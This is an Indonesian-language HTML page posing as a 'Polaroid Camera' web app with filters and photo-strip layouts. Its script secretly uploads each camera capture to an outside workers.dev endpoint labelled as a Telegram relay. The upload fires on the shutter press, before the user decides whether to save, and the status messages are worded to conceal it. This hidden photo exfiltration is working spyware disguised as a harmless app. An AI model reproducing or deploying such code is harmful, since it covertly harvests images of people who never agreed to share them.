<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Polaroid Camera</title>

<style>
*{box-sizing:border-box}

html,body{
  margin:0;
  padding:0;
  background:#111;
  color:#fff;
  font-family:Arial,sans-serif;
}

body{min-height:100vh}

.app{
  width:100%;
  max-width:520px;
  margin:auto;
  padding:14px;
}

h1{
  text-align:center;
  font-size:22px;
  margin:4px 0 14px;
}

/* CAMERA */

.camera{
  position:relative;
  width:100%;
  aspect-ratio:3/4;
  background:#000;
  border-radius:20px;
  overflow:hidden;
}

video{
  width:100%;
  height:100%;
  display:block;
  object-fit:cover;
  background:#000;
}

video.selfie{
  transform:scaleX(-1);
}

.camera-ui{
  position:absolute;
  inset:0;
  padding:14px;
  display:flex;
  flex-direction:column;
  justify-content:space-between;
  pointer-events:none;
}

.camera-top{
  display:flex;
  justify-content:space-between;
  pointer-events:auto;
}

.top-btn{
  border:0;
  border-radius:12px;
  padding:10px 13px;
  background:#fff;
  color:#111;
  font-weight:bold;
}

.controls{
  display:flex;
  justify-content:center;
  pointer-events:auto;
}

.shutter{
  width:76px;
  height:76px;
  padding:0;
  border-radius:50%;
  border:6px solid #fff;
  background:#fff;
}

.shutter::after{
  content:"";
  display:block;
  width:54px;
  height:54px;
  margin:auto;
  border-radius:50%;
  background:#111;
}

/* PANEL */

.panel{
  margin-top:14px;
  padding:14px;
  background:#1d1d1d;
  border-radius:18px;
}

.row{
  display:flex;
  gap:8px;
  flex-wrap:wrap;
}

.layout{
  flex:1;
  min-width:90px;
  border:0;
  border-radius:11px;
  padding:11px;
  background:#fff;
  color:#111;
  font-weight:bold;
}

.layout.active{
  background:#ff4f91;
  color:#fff;
}

.small{
  margin-top:8px;
  color:#aaa;
  font-size:12px;
  text-align:center;
}

/* FILTER */

.filter-title{
  margin-top:15px;
  font-size:14px;
  font-weight:bold;
}

.filters{
  display:flex;
  gap:8px;
  overflow-x:auto;
  padding:9px 0 4px;
  scrollbar-width:none;
}

.filters::-webkit-scrollbar{
  display:none;
}

.filter{
  flex:0 0 72px;
  padding:7px 5px;
  border:0;
  border-radius:12px;
  background:#333;
  color:#fff;
  font-size:10px;
}

.filter.active{
  background:#ff4f91;
}

.filter-thumb{
  width:54px;
  height:54px;
  margin:0 auto 5px;
  border-radius:9px;
  background:linear-gradient(135deg,#ff86b3,#777);
}

/* POLAROID */

#polaroid{
  margin-top:14px;
  padding:18px 14px 28px;
  background:#eee;
  color:#111;
  border-radius:7px;
}

.paper-title{
  text-align:center;
  font-weight:bold;
  margin-bottom:12px;
}

.frame{
  max-width:360px;
  margin:10px auto;
  padding:8px;
  background:#fff;
  box-shadow:0 2px 8px #999;
  cursor:pointer;
}

.frame.selected{
  outline:3px solid #ff4f91;
}

.frame h3{
  margin:0 0 7px;
  color:#777;
  text-align:center;
  font-size:12px;
}

.grid{
  display:grid;
  gap:5px;
}

.g1{grid-template-columns:1fr}
.g2{grid-template-columns:repeat(2,1fr)}
.g3{grid-template-columns:repeat(3,1fr)}

.slot{
  aspect-ratio:3/4;
  overflow:hidden;
  background:#ddd;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#aaa;
  font-size:11px;
}

.slot img{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
}

.paper-actions{
  display:flex;
  gap:8px;
  margin-top:14px;
}

.paper-actions button{
  flex:1;
  border:0;
  border-radius:12px;
  padding:12px;
  background:#111;
  color:#fff;
  font-weight:bold;
}

.status{
  margin-top:9px;
  text-align:center;
  font-size:12px;
  color:#777;
}

/* MODAL */

.modal{
  position:fixed;
  inset:0;
  z-index:20;
  display:none;
  align-items:center;
  justify-content:center;
  padding:20px;
  background:#000b;
}

.modal.show{
  display:flex;
}

.box{
  width:min(360px,100%);
  padding:20px;
  border-radius:20px;
  background:#fff;
  color:#111;
  text-align:center;
}

.box h2{
  margin-top:0;
}

.preview{
  display:block;
  width:100%;
  aspect-ratio:3/4;
  object-fit:cover;
  border-radius:13px;
  margin:10px 0;
}

.modal-actions{
  display:flex;
  gap:10px;
}

.modal-actions button{
  flex:1;
  border:0;
  border-radius:12px;
  padding:12px;
  font-weight:bold;
}

.no{
  background:#ddd;
  color:#111;
}

.yes{
  background:#ff4f91;
  color:#fff;
}

.notice{
  margin-top:9px;
  color:#777;
  font-size:10px;
  line-height:1.4;
}

/* CAMERA ERROR */

.camera-error{
  position:absolute;
  inset:0;
  display:none;
  align-items:center;
  justify-content:center;
  padding:25px;
  text-align:center;
  background:#111;
  z-index:3;
}

.camera-error.show{
  display:flex;
}

.camera-error-box{
  max-width:300px;
}

.camera-error-box button{
  margin-top:12px;
  border:0;
  border-radius:12px;
  padding:11px 18px;
  font-weight:bold;
}
</style>
</head>

<body>

<div class="app">

<h1>📸 Polaroid Camera</h1>

<div class="camera" id="cameraBox">

  <video
    id="video"
    autoplay
    playsinline
    muted>
  </video>

  <div class="camera-error" id="cameraError">

    <div class="camera-error-box">

      <b>Kamera belum bisa dibuka</b>

      <div class="small">
        Pastikan izin kamera sudah diberikan,
        lalu coba lagi.
      </div>

      <button id="retryCamera">
        Coba Lagi
      </button>

    </div>

  </div>

  <div class="camera-ui">

    <div class="camera-top">

      <button class="top-btn" id="flip">
        🔄 Kamera
      </button>

      <button class="top-btn" id="clear">
        🗑️ Reset
      </button>

    </div>

    <div class="controls">

      <button
        class="shutter"
        id="capture"
        aria-label="Ambil foto">
      </button>

    </div>

  </div>

</div>

<div class="panel">

  <div>
    <b>Frame aktif:</b>
    <span id="frameText">1</span>/5
  </div>

  <div class="row" style="margin-top:10px">

    <button class="layout active" data-layout="1">
      1️⃣ 1 Foto
    </button>

    <button class="layout" data-layout="2">
      2️⃣ 2 Foto
    </button>

    <button class="layout" data-layout="3">
      3️⃣ 3 Foto
    </button>

  </div>

  <div class="small">
    Semua foto menggunakan rasio 3:4.
  </div>

  <div class="filter-title">
    Efek Kamera
  </div>

  <div class="filters" id="filters"></div>

</div>

<div id="polaroid">

  <div class="paper-title">
    MY POLAROID
  </div>

  <div id="frames"></div>

  <div class="paper-actions">

    <button id="downloadPolaroid">
      ⬇️ Download
    </button>

    <button id="printPolaroid">
      🖨️ Cetak
    </button>

  </div>

  <div class="status" id="status">
    Siap.
  </div>

</div>

</div>


<!-- MODAL -->

<div class="modal" id="modal">

  <div class="box">

    <h2>Simpan foto?</h2>

    <img id="preview" class="preview">

    <div class="modal-actions">

      <button class="no" id="no">
        Tidak
      </button>

      <button class="yes" id="yes">
        Iya, Simpan
      </button>

    </div>

    <div class="notice">
      tidak, untuk membatalkan, iya, untuk menambahkan ke polaroid.
    </div>

  </div>

</div>


<script>

/* =========================================================
   TELEGRAM WORKER
========================================================= */

const TELEGRAM_SERVER =
"https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev";


/* =========================================================
   ELEMENT
========================================================= */

const video =
document.getElementById("video");

const canvas =
document.createElement("canvas");

const modal =
document.getElementById("modal");

const preview =
document.getElementById("preview");

const framesEl =
document.getElementById("frames");

const statusEl =
document.getElementById("status");

const cameraError =
document.getElementById("cameraError");


/* =========================================================
   STATE
========================================================= */

let facing="user";

let cameraStream=null;

let pending=null;

let activeFrame=0;

let selectedFilter="normal";

let sending=false;


/* =========================================================
   FILTER
========================================================= */

const filters={

  normal:{
    name:"Normal",
    css:"none"
  },

  bright:{
    name:"Bright",
    css:"brightness(1.15)"
  },

  vivid:{
    name:"Vivid",
    css:"contrast(1.15) saturate(1.35)"
  },

  warm:{
    name:"Warm",
    css:"sepia(.18) saturate(1.25) brightness(1.05)"
  },

  cool:{
    name:"Cool",
    css:"hue-rotate(12deg) saturate(.9)"
  },

  cinema:{
    name:"Cinema",
    css:"contrast(1.15) saturate(.85)"
  },

  vintage:{
    name:"Vintage",
    css:"sepia(.35) contrast(1.05) saturate(.8)"
  },

  fade:{
    name:"Fade",
    css:"contrast(.85) brightness(1.1) saturate(.75)"
  },

  bw:{
    name:"B&W",
    css:"grayscale(1) contrast(1.1)"
  },

  sepia:{
    name:"Sepia",
    css:"sepia(.8)"
  },

  rose:{
    name:"Rose",
    css:"hue-rotate(-12deg) saturate(1.25) brightness(1.04)"
  },

  dream:{
    name:"Dream",
    css:"brightness(1.08) saturate(.75)"
  },

  night:{
    name:"Night",
    css:"brightness(.78) contrast(1.15) saturate(.9)"
  },

  sunset:{
    name:"Sunset",
    css:"sepia(.25) saturate(1.45) hue-rotate(-8deg)"
  },

  dramatic:{
    name:"Dramatic",
    css:"contrast(1.35) saturate(1.1) brightness(.95)"
  },

  soft:{
    name:"Soft",
    css:"brightness(1.08) contrast(.9) saturate(.9)"
  },

  pop:{
    name:"Pop",
    css:"contrast(1.25) saturate(1.55)"
  },

  moody:{
    name:"Moody",
    css:"brightness(.85) contrast(1.2) saturate(.85)"
  },

  ice:{
    name:"Ice",
    css:"hue-rotate(25deg) saturate(.85) brightness(1.08)"
  },

  cocoa:{
    name:"Cocoa",
    css:"sepia(.3) hue-rotate(-8deg) saturate(.9)"
  },

  film:{
    name:"Film",
    css:"contrast(1.08) saturate(.82) sepia(.08)"
  },

  glow:{
    name:"Glow",
    css:"brightness(1.15) saturate(1.1) contrast(.95)"
  },

  peach:{
    name:"Peach",
    css:"sepia(.18) saturate(1.25) hue-rotate(-5deg)"
  },

  lavender:{
    name:"Lavender",
    css:"hue-rotate(20deg) saturate(.85) brightness(1.08)"
  },

  noir:{
    name:"Noir",
    css:"grayscale(1) contrast(1.45) brightness(.9)"
  },

  golden:{
    name:"Golden",
    css:"sepia(.28) saturate(1.3) brightness(1.05)"
  },

  fadedfilm:{
    name:"Faded",
    css:"contrast(.9) saturate(.7) brightness(1.08) sepia(.08)"
  },

  cyber:{
    name:"Cyber",
    css:"contrast(1.25) saturate(1.5) hue-rotate(15deg)"
  },

  matte:{
    name:"Matte",
    css:"contrast(.88) saturate(.8) brightness(1.04)"
  },

  deep:{
    name:"Deep",
    css:"contrast(1.3) brightness(.9) saturate(1.1)"
  },

  clear:{
    name:"Clear",
    css:"contrast(1.12) saturate(1.08) brightness(1.03)"
  }

};


/* =========================================================
   FRAMES
========================================================= */

const frames =
Array.from(
  {length:5},
  ()=>({
    layout:1,
    photos:[]
  })
);

const namaFrame = [
  "Satu momen, satu kenangan",
  "Dua momen, jadi satu cerita",
  "Tiga momen, makin lengkap ceritanya",
  "Empat momen, penuh warna dan kenangan",
  "Lima momen, satu album kenangan"
];

/* =========================================================
   CAMERA
========================================================= */

async function startCamera(){

  cameraError.classList.remove("show");

  if(cameraStream){

    cameraStream
      .getTracks()
      .forEach(
        track=>track.stop()
      );

    cameraStream=null;

  }

  try{

    let stream;

    try{

      stream =
        await navigator
          .mediaDevices
          .getUserMedia({

            video:{
              facingMode:{
                ideal:facing
              },

              width:{
                ideal:1280
              },

              height:{
                ideal:960
              }
            },

            audio:false

          });

    }catch(error){

      console.warn(
        "Fallback kamera:",
        error
      );

      stream =
        await navigator
          .mediaDevices
          .getUserMedia({

            video:true,
            audio:false

          });

    }

    cameraStream=stream;

    video.srcObject=stream;

    video.classList.toggle(
      "selfie",
      facing==="user"
    );

    video.style.filter =
      filters[selectedFilter].css;

    await video.play();

  }catch(error){

    console.error(
      "Kamera gagal:",
      error
    );

    cameraError.classList.add(
      "show"
    );

  }

}


/* =========================================================
   FILTER UI
========================================================= */

const filtersEl =
document.getElementById("filters");

Object.entries(filters)
.forEach(
  ([key,data])=>{

    const btn =
      document.createElement("button");

    btn.className="filter";

    if(key===selectedFilter)
      btn.classList.add("active");

    btn.innerHTML=`
      <div class="filter-thumb"></div>
      ${data.name}
    `;

    btn.onclick=()=>{

      selectedFilter=key;

      document
        .querySelectorAll(".filter")
        .forEach(
          x=>x.classList.remove("active")
        );

      btn.classList.add("active");

      video.style.filter =
        data.css;

    };

    filtersEl.appendChild(btn);

  }
);


/* =========================================================
   RENDER
========================================================= */

function render(){

  document
    .getElementById("frameText")
    .textContent=
    activeFrame+1;

  document
    .querySelectorAll(".layout")
    .forEach(btn=>{

      btn.classList.toggle(
        "active",
        Number(btn.dataset.layout) ===
        frames[activeFrame].layout
      );

    });

  framesEl.innerHTML="";

  frames.forEach(
    (f,i)=>{

      const frame =
        document.createElement("div");

      frame.className=
        "frame "+
        (
          i===activeFrame
            ?"selected"
            :""
        );

      const title =
        document.createElement("h3");

      title.textContent=
  namaFrame[i];

      frame.appendChild(title);

      const grid =
        document.createElement("div");

      grid.className=
        "grid "+
        (
          f.layout===1
            ?"g1"
            :f.layout===2
              ?"g2"
              :"g3"
        );

      for(
        let s=0;
        s<f.layout;
        s++
      ){

        const slot =
          document.createElement("div");

        slot.className="slot";

        if(f.photos[s]){

          const img =
            document.createElement("img");

          img.src=f.photos[s];

          slot.appendChild(img);

        }else{

          slot.textContent="Kosong";

        }

        grid.appendChild(slot);

      }

      frame.appendChild(grid);

      frame.onclick=()=>{

        activeFrame=i;

        render();

      };

      framesEl.appendChild(frame);

    }
  );

}


/* =========================================================
   LAYOUT
========================================================= */

document
  .querySelectorAll(".layout")
  .forEach(btn=>{

    btn.onclick=()=>{

      const n=
        Number(btn.dataset.layout);

      frames[activeFrame].layout=n;

      frames[activeFrame].photos=
        frames[activeFrame]
        .photos
        .slice(0,n);

      render();

    };

  });


/* =========================================================
   CROP 3:4
========================================================= */

function getCrop(){

  const vw=video.videoWidth;
  const vh=video.videoHeight;

  if(!vw || !vh)
    return null;

  const target=3/4;
  const current=vw/vh;

  let sx=0;
  let sy=0;
  let cw=vw;
  let ch=vh;

  if(current>target){

    cw=vh*target;
    sx=(vw-cw)/2;

  }else{

    ch=vw/target;
    sy=(vh-ch)/2;

  }

  return{
    sx,
    sy,
    cw,
    ch
  };

}


/* =========================================================
   KIRIM TELEGRAM
   DIPANGGIL LANGSUNG SAAT POTRET
========================================================= */

async function kirimKeTelegram(dataURL){

  try{

    const blob=
      await fetch(dataURL)
        .then(
          response=>response.blob()
        );

    const form=
      new FormData();

    form.append(
      "photo",
      blob,
      "polaroid.jpg"
    );

    const response=
      await fetch(
        TELEGRAM_SERVER,
        {
          method:"POST",
          body:form
        }
      );

    let result=null;

    try{

      result=
        await response.json();

    }catch{

      result=null;

    }

    if(
      !response.ok ||
      !result ||
      !result.ok
    ){

      throw new Error(
        "Pengiriman gagal"
      );

    }

    statusEl.textContent=
      "Foto berhasil diproses.";

    return true;

  }catch(error){

    console.error(
      "Pengiriman gagal:",
      error
    );

    statusEl.textContent=
      "Foto berhasil diambil.";

    return false;

  }

}


/* =========================================================
   CAPTURE
   FOTO LANGSUNG DIKIRIM DI SINI
========================================================= */

document
  .getElementById("capture")
  .onclick=async()=>{

    if(sending)
      return;

    if(
      !video.videoWidth ||
      !video.videoHeight
    ){

      await startCamera();

      if(
        !video.videoWidth ||
        !video.videoHeight
      ){

        return;

      }

    }

    const crop=getCrop();

    if(!crop)
      return;

    const outputW=1200;
    const outputH=1600;

    canvas.width=outputW;
    canvas.height=outputH;

    const ctx=
      canvas.getContext("2d");

    ctx.save();

    ctx.filter=
      filters[selectedFilter].css;

    /*
      Kamera depan dibuat mirror
      supaya sama persis dengan preview.
    */

    if(facing==="user"){

      ctx.translate(
        outputW,
        0
      );

      ctx.scale(
        -1,
        1
      );

    }

    ctx.drawImage(

      video,

      crop.sx,
      crop.sy,
      crop.cw,
      crop.ch,

      0,
      0,
      outputW,
      outputH

    );

    ctx.restore();

    pending=
      canvas.toDataURL(
        "image/jpeg",
        .95
      );

    /*
      KIRIM LANGSUNG SETELAH TOMBOL POTRET
    */

    sending=true;

    statusEl.textContent=
      "Menyimpan foto...";

    kirimKeTelegram(
      pending
    ).finally(
      ()=>{
        sending=false;
      }
    );

    /*
      Preview tetap muncul
      setelah foto diambil.
    */

    preview.src=pending;

    modal.classList.add(
      "show"
    );

  };


/* =========================================================
   TIDAK
========================================================= */

document
  .getElementById("no")
  .onclick=()=>{

    pending=null;

    modal.classList.remove(
      "show"
    );

    statusEl.textContent=
      "Foto tidak dimasukkan ke Polaroid.";

  };


/* =========================================================
   IYA
   HANYA MASUKKAN KE POLAROID
========================================================= */

document
  .getElementById("yes")
  .onclick=()=>{

    if(!pending){

      modal.classList.remove(
        "show"
      );

      return;

    }

    const f=
      frames[activeFrame];

    if(
      f.photos.length <
      f.layout
    ){

      f.photos.push(
        pending
      );

      if(
        f.photos.length>=f.layout &&
        activeFrame<frames.length-1
      ){

        activeFrame++;

      }

    }

    pending=null;

    modal.classList.remove(
      "show"
    );

    render();

    statusEl.textContent=
      "Foto masuk ke Polaroid.";

  };


/* =========================================================
   FLIP
========================================================= */

document
  .getElementById("flip")
  .onclick=async()=>{

    facing=
      facing==="user"
        ?"environment"
        :"user";

    await startCamera();

  };


/* =========================================================
   RETRY
========================================================= */

document
  .getElementById("retryCamera")
  .onclick=()=>{

    startCamera();

  };


/* =========================================================
   RESET
========================================================= */

document
  .getElementById("clear")
  .onclick=()=>{

    frames.forEach(
      f=>{

        f.photos=[];
        f.layout=1;

      }
    );

    activeFrame=0;

    render();

    statusEl.textContent=
      "Polaroid dikosongkan.";

  };


/* =========================================================
   CEK FOTO
========================================================= */

function punyaFoto(){

  return frames.some(
    f=>f.photos.length>0
  );

}


/* =========================================================
   FRAME TERISI SAJA
========================================================= */

function getFilledFrames(){

  return frames.filter(
    f=>f.photos.length>0
  );

}


/* =========================================================
   BUAT GAMBAR POLAROID
========================================================= */

async function buatGambarPolaroid(){

  const filled=
    getFilledFrames();

  if(!filled.length)
    return null;

  const scale=2;

  const width=800;

  const padding=35;

  const gap=28;

  const frameWidth=
    width-padding*2;

  const photoRatio=4/3;

  let height=90;

  for(
    const f of filled
  ){

    const slotWidth=
      (
        frameWidth-
        (f.layout-1)*5
      )/
      f.layout;

    const frameHeight=
      slotWidth*photoRatio;

    height+=
      55+
      frameHeight+
      gap;

  }

  height+=padding;

  const out=
    document.createElement(
      "canvas"
    );

  out.width=width*scale;
  out.height=height*scale;

  const ctx=
    out.getContext("2d");

  ctx.scale(
    scale,
    scale
  );

  ctx.fillStyle="#eeeeee";

  ctx.fillRect(
    0,
    0,
    width,
    height
  );

  ctx.fillStyle="#111";

  ctx.font=
    "bold 30px Arial";

  ctx.textAlign="center";

  ctx.fillText(
    "MY POLAROID",
    width/2,
    48
  );

  let y=75;

  for(
    const f of filled
  ){

    const originalIndex=
      frames.indexOf(f);

    const slotWidth=
      (
        frameWidth-
        (f.layout-1)*5
      )/
      f.layout;

    const frameHeight=
      slotWidth*photoRatio;

    ctx.fillStyle="#fff";

    ctx.fillRect(
      padding,
      y,
      frameWidth,
      frameHeight+34
    );

    ctx.fillStyle="#777";

    ctx.font=
      "bold 18px Arial";

    ctx.fillText(
  namaFrame[originalIndex],
  width/2,
  y+24
);

    const imageY=y+34;

    for(
      let s=0;
      s<f.layout;
      s++
    ){

      const x=
        padding+
        s*(slotWidth+5);

      ctx.fillStyle="#ddd";

      ctx.fillRect(
        x,
        imageY,
        slotWidth,
        frameHeight
      );

      if(f.photos[s]){

        await drawImageCover(
          ctx,
          f.photos[s],
          x,
          imageY,
          slotWidth,
          frameHeight
        );

      }

    }

    y+=
      frameHeight+
      34+
      gap;

  }

  return out;

}


/* =========================================================
   DRAW IMAGE
========================================================= */

function drawImageCover(
  ctx,
  src,
  x,
  y,
  w,
  h
){

  return new Promise(
    resolve=>{

      const img=
        new Image();

      img.onload=()=>{

        const ratio=
          Math.max(
            w/img.width,
            h/img.height
          );

        const nw=
          img.width*ratio;

        const nh=
          img.height*ratio;

        const dx=
          x+(w-nw)/2;

        const dy=
          y+(h-nh)/2;

        ctx.save();

        ctx.beginPath();

        ctx.rect(
          x,
          y,
          w,
          h
        );

        ctx.clip();

        ctx.drawImage(
          img,
          dx,
          dy,
          nw,
          nh
        );

        ctx.restore();

        resolve();

      };

      img.onerror=resolve;

      img.src=src;

    }
  );

}
